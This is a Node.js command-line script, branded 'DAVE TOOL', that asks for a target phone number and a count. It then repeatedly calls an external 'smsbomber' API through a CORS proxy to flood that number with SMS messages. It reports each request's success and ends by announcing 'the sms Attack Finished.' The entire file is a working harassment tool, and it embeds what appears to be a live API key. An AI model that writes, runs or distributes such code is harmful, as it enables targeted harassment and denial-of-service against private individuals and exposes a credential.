const fetch = require('node-fetch');
const chalk = require('chalk');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const API_KEY = 'b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8';

function ask(question) {
  return new Promise((resolve) => {
    rl.question(question, resolve);
  });
}

async function sendSMS(target, count) {
  if (API_KEY === 'YOUR_API_KEY') {
    console.log(chalk.red.bold('❌ ERROR: Please set your real API key!'));
    return;
  }

  for (let i = 1; i <= count; i++) {
    console.log(chalk.white(`⏳ Sending request ${i}...`));

    const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${target}&amount=1&api_key=${API_KEY}`;

    try {
      const response = await fetch(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'application/json'
        },
        timeout: 10000
      });

      if (response.ok) {
        const data = await response.json();
        if (data.status) {
          console.log(chalk.green(`✔ SUCCESS`));
          console.log(`Message: ${data.message}`);
          console.log(`Success: ${data.details.total_success} | Failed: ${data.details.total_failed}`);
        } else {
          console.log(chalk.red(`✘ FAILED: Response Error`));
        }
      } else {
        console.log(chalk.red(`✘ FAILED: HTTP ${response.status}`));
      }

    } catch (err) {
      console.log(chalk.red(`✘ FAILED: ${err.message}`));
    }

    await new Promise(r => setTimeout(r, 1000));
  }
}

async function main() {
  console.clear();
  console.log(chalk.cyan.bold(`
  _____   ___    __      ______   ____   ___  
 |  __ \\ / _ \\   \\ \\    / /  _ \\ |___ \\ / _ \\ 
 | |  | | | | |   \\ \\  / /| | | |  __) | | | |
 | |  | | | | |    \\ \\/ / | | | ||__ <| | | |
 | |__| | |_| |     \\  /  | |_| |___) | |_| |
 |_____/ \\___/       \\/   |____/|____/ \\___/ 2.0
`));
  console.log(chalk.blue('DAVE TOOL\n'));

  const target = await ask('📱 Enter target phone number: ');
  const count = parseInt(await ask('📤 How many times to send: '), 10);

  console.log(chalk.cyan(`\n🚀 Sending ${count} requests...\n`));
  await sendSMS(target, count);

  console.log(chalk.green.bold('✅ the sms Attack Finished.'));
  rl.close();
}

main();